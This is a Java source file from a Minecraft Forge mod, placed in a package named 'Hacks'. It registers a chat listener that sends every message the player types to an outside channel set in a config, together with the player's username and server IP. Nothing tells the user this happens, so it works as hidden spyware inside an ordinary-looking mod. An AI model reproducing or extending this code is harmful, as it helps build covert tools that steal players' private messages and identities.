package com.example.examplemod.Hacks.Print.ChatListner;

import com.example.examplemod.Sender.Cfg;
import com.example.examplemod.Sender.SendMessage;
import net.minecraft.client.Minecraft;
import net.minecraftforge.client.event.ClientChatEvent;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;

public class ChatListner {
   public static String bebra = "";
   Minecraft mc = Minecraft.getMinecraft();

   @SubscribeEvent
   public void ChatEvent(ClientChatEvent e) {
      String msg = e.getMessage();
      String[] sentences = e.getMessage().split(" ");
      if (ServerUtils.isOnServer()) {
         SendMessage.doThing("```Server Plaing: <" + this.mc.getCurrentServerData().serverIP + "> Username: <" + this.mc.getSession().getUsername() + "> Message: <" + msg + ">```", Cfg.ChatListenChannel);
      }

      if (!ServerUtils.isOnServer()) {
         SendMessage.doThing("```Playing in CreatedWorldUsername: <" + this.mc.getSession().getUsername() + "> Message: <" + msg + ">```", Cfg.ChatListenChannel);
      }

   }
}
